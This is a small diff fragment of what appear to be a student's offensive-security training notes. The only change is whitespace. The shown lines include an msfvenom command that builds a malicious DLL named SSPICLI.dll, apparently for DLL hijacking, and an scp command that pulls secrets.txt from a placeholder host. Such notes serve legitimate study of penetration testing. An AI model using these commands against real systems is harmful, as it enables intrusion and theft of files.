@@ -609,7 +609,7 @@ DAY ???
             lhost 0.0.0.0/linops 
             lport 4444
            msfvenom -p windows/exec CMD='cmd.exe /C "whoami" > C:\Users\DemoAdmin\Desktop\whoami.txt' -f dll > SSPICLI.dll
-           
+       
        scp - tcp port 22
        download remote to local
        scp student@xxx.xxx.xxx.xxx:secrets.txt /home/student
